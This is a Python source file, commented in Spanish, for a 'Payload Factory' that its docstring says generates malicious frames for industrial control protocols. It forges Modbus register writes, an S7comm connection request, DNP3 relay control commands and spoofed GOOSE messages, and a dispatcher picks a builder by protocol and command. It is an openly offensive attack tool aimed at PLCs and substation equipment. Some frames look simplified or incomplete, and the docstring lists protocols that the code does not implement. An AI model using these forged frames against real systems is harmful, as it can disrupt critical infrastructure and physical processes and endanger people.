"""
Payload Factory — Construye payloads específicos para protocolos ICS.
Genera tramas maliciosas para Modbus, S7comm, DNP3, IEC 104, GOOSE, etc.
"""
from typing import Dict, Any, Optional


class PayloadFactory:
    @staticmethod
    def modbus_write_payload(address: int, value: int, function_code: int = 6) -> bytes:
        if function_code == 6:
            return bytes([0, 1, 0, 0, 0, 6, 1, function_code, address >> 8, address & 0xFF, value >> 8, value & 0xFF])
        elif function_code == 16:
            return bytes([0, 1, 0, 0, 0, 9, 1, function_code, address >> 8, address & 0xFF, 0, 1, 2, value >> 8, value & 0xFF])
        raise ValueError(f"Unsupported function code: {function_code}")

    @staticmethod
    def s7_connect_payload(rack: int = 0, slot: int = 1) -> bytes:
        return bytes.fromhex(f"0300001611e00000000100c0010ac1020100c20201{rack:02x}{slot:02x}")

    @staticmethod
    def dnp3_crob_payload(index: int, control_code: int = 0x03, count: int = 1, on_time: int = 100, off_time: int = 100) -> bytes:
        header = bytes([0x05, 0x64, 0x0C, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00])
        crob = bytes([control_code, count & 0xFF, (count >> 8) & 0xFF, on_time & 0xFF, (on_time >> 8) & 0xFF, off_time & 0xFF, (off_time >> 8) & 0xFF])
        index_bytes = bytes([index & 0xFF, (index >> 8) & 0xFF])
        return header + crob + index_bytes

    @staticmethod
    def goose_spoof_payload(go_id: str, data_set: str, values: list, stnum: int = 1, sqnum: int = 1) -> bytes:
        payload = b"\x61\x81\xF6\x80\x01\x00\xA6\x81"
        go_id_bytes = go_id.encode()
        payload += bytes([len(go_id_bytes)]) + go_id_bytes
        payload += bytes([stnum & 0xFF, sqnum & 0xFF])
        for v in values:
            if isinstance(v, bool):
                payload += bytes([0x83, 0x01, 1 if v else 0])
            elif isinstance(v, (int, float)):
                payload += bytes([0x84, 0x04]) + int(v).to_bytes(4, 'big')
        return payload

    def build(self, protocol: str, command: str, params: Dict[str, Any]) -> bytes:
        builders = {
            "modbus": {"write": self.modbus_write_payload},
            "dnp3": {"crob": self.dnp3_crob_payload},
            "goose": {"spoof": self.goose_spoof_payload},
        }
        builder = builders.get(protocol, {}).get(command)
        if not builder:
            raise ValueError(f"No payload builder for {protocol}/{command}")
        return builder(**params)
